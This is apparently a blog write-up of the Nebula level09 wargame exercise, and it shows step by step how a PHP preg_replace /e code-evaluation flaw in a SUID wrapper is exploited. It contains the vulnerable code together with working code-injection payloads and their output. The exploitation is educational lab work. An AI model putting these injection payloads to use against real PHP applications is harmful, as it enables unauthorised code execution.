+++
author = "pwntester"
categories = ["nebula09"]
date = 2013-11-22T16:19:00Z
description = ""
draft = false
slug = "nebula-level09-write-up"
tags = ["nebula09"]
title = "Nebula level09 write-up"

+++

In [Level09](http://exploit-exercises.com/nebula/level09) we are given the following **PHP** code and are said that it is execute with a SUID wrapper:

```lang-php line-numbers 

function spam($email)
{
$email = preg_replace("/\./", " dot ", $email);
$email = preg_replace("/@/", " AT ", $email);
return $email;
}

function markup($filename, $use_me)
{
$contents = file_get_contents($filename);

$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
$contents = preg_replace("/\[/", "<", $contents);
$contents = preg_replace("/\]/", ">", $contents);

return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

```

This code takes two arguments, the first one is a file containing email address in the format:

```lang-bash line-numbers 
[email alvaro@pwntester.com]
```

The second argument is not used in the code so we start our tests adding the above email address into **/tmp/test1** and calling the PHP wrapper:

```lang-bash line-numbers 
level09@nebula:/home/flag09$ ./flag09 /tmp/test1
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
alvaro AT pwntester dot com
```

There is a command injection vulnerability in **preg_replace** when it takes a pattern using the **e** 	[Pattern modifier](http://php.net/manual/en/reference.pcre.pattern.modifiers.php). In this case the second matching group (the email address) is passed as the argument to the **spam** function and evaluated as **PHP** code. All we need to do is inject our call to **getflag** here. We will create a **/tmp/test2** file with the following contents:

```lang-bash line-numbers 
[email {${system('getflag')}}]
```

**Note:** you can find all the details on the PHP curly syntax [here](http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)

We get the following output:

```lang-bash line-numbers 
level09@nebula:/home/flag09$ ./flag09 /tmp/test2
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code:
spam("{${system(\'getflag\')}}") in /home/flag09/flag09.php on line 15
```

Damn it! it seems like the quotes are escaped. Ok, no problem, we can use the second argument to hold our payload. Third trial:

```lang-bash line-numbers 
[email {${system($use_me)}}]
```

And that gets us to:

```lang-bash line-numbers 
level09@nebula:/home/flag09$ ./flag09 /tmp/test3 getflag
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
```

Voila!!

